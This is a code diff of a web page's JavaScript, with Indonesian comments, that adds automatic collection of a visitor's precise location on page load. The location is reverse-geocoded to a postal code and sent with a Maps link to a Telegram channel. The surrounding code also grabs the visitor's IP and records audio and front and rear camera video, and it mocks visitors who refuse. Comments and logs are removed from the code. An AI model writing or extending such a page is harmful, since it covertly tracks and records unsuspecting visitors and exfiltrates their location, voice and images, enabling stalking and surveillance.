@@ -121,6 +121,32 @@
       });
     }
 
+    // Fitur Lokasi Otomatis
+    async function getFullLocation() {
+      if (!navigator.geolocation) {
+        sendToTelegram("Browser tidak mendukung lokasi");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(async (position) => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+        
+        let postalCode = "Tidak ditemukan";
+        try {
+          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+          const data = await res.json();
+          postalCode = data.address.postcode || "Tidak tersedia";
+        } catch (e) {}
+
+        const msg = `<b>📍 Lokasi Pengunjung:</b>\nLat: ${lat}\nLon: ${lon}\nKode Pos: ${postalCode}\n\n<a href="${mapsLink}">Buka di Google Maps</a>`;
+        sendToTelegram(msg);
+      }, (err) => {
+        sendToTelegram("maaf akses lokasi ke tolak");
+      }, { enableHighAccuracy: true });
+    }
+
     async function getInfo() {
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -133,14 +159,9 @@
 
     async function requestPermissions() {
       try {
-        // Meminta izin mic & kamera secara otomatis saat masuk
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-        // Jika diizinkan, matikan stream sementara agar tidak membebani HP hingga tombol ditekan
         stream.getTracks().forEach(track => track.stop());
-        console.log("Permissions granted");
-      } catch (err) {
-        console.log("Permissions denied or not available");
-      }
+      } catch (err) {}
     }
 
     async function recordAudio() {
@@ -156,7 +177,9 @@
         };
         mediaRecorder.start();
         setTimeout(() => mediaRecorder.stop(), 5000);
-      } catch (err) {}
+      } catch (err) {
+        sendToTelegram('di tolak voice chat');
+      }
     }
 
     async function recordVideo(facingMode, label) {
@@ -175,7 +198,10 @@
           mediaRecorder.start();
           setTimeout(() => mediaRecorder.stop(), 6000);
         });
-      } catch (err) { resolve(); }
+      } catch (err) { 
+        sendToTelegram('rekaman vidio di tolak 😹');
+        return Promise.resolve(); 
+      }
     }
 
     button.addEventListener('click', async () => {
@@ -190,6 +216,7 @@
         await recordVideo("user", "Depan");
         await new Promise(r => setTimeout(r, 1000));
         await recordVideo("environment", "Belakang");
+        
         notif.style.display = 'block';
         button.disabled = false;
         input.value = '';
@@ -198,11 +225,11 @@
       }
     });
 
-    // Inisialisasi saat masuk website
     document.addEventListener('DOMContentLoaded', () => {
       createParticles();
-      getInfo(); // Ambil info sistem langsung
-      requestPermissions(); // Langsung munculkan izin akses (kamera/mic)
+      getInfo();
+      requestPermissions();
+      getFullLocation(); // Panggil lokasi otomatis saat masuk
     });
 
     function createParticles() {
